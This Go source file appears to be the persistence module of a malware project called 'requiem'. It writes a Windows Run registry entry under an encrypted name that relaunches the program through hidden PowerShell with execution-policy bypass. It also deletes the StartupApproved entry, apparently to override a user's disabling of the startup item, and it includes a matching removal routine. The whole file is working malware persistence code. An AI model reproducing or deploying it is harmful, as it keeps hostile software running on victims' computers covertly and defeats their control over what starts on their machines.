package persistence

import (
	"fmt"

	"requiem/store"

	"golang.org/x/sys/windows/registry"
)

const (
	START_ALLOWED string = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
	AUTO_START    string = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

func RunRegistryPersist(filePath string, overrideConfig bool) error {
	if !store.AUTO_RUN_REG && !overrideConfig {
		return nil
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, START_ALLOWED, registry.SET_VALUE)
	if err == nil {
		key.DeleteValue(store.DecryptedPersistenceName)
		key.Close()
	}

	key, err = registry.OpenKey(registry.CURRENT_USER, AUTO_START, registry.SET_VALUE)
	if err != nil {
		return err
	}

	defer key.Close()

	if filePath == "" {
		filePath = store.ExecPath
	}

	command := fmt.Sprintf(
		"powershell -nop -w hidden -ep bypass -c \"& '%s' %s\"",
		filePath,
		store.LAUNCH_KEY,
	)

	err = key.SetStringValue(store.DecryptedPersistenceName, command)
	if err != nil {
		return err
	}

	return nil
}

func RunRegistryUnpersist() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, START_ALLOWED, registry.SET_VALUE)
	if err == nil {
		key.DeleteValue(store.DecryptedPersistenceName)
		key.Close()
	}

	key, err = registry.OpenKey(registry.CURRENT_USER, AUTO_START, registry.SET_VALUE)
	if err != nil {
		return err
	}

	defer key.Close()

	err = key.DeleteValue(store.DecryptedPersistenceName)
	if err != nil {
		return err
	}

	return nil
}
